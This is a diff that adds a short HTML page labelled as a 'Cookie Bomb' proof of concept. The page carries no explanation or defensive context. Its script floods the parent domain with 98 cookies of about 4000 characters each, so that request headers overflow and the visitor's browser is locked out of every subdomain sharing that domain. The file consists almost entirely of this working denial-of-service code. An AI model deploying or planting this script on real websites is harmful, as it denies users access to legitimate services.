@@ -1,0 +1,19 @@
+<html>
+<head>
+    <title>Cookie Bomb PoC</title>
+</head>
+<body>
+<script>
+    // Extract base domain to target shared subdomains
+    var base_domain = document.domain.substr(document.domain.indexOf('.'));
+    // Create a massive string of characters
+    var pollution = Array(4000).join('a');
+    
+    // Set multiple large cookies to overflow the header limit
+    for(var i = 1; i < 99; i++) {
+        document.cookie = 'bomb' + i + '=' + pollution + ';Domain=' + base_domain + ';path=/';
+    }
+</script>
+<h1>Cookie Bomb executed!</h1>
+</body>
+</html>
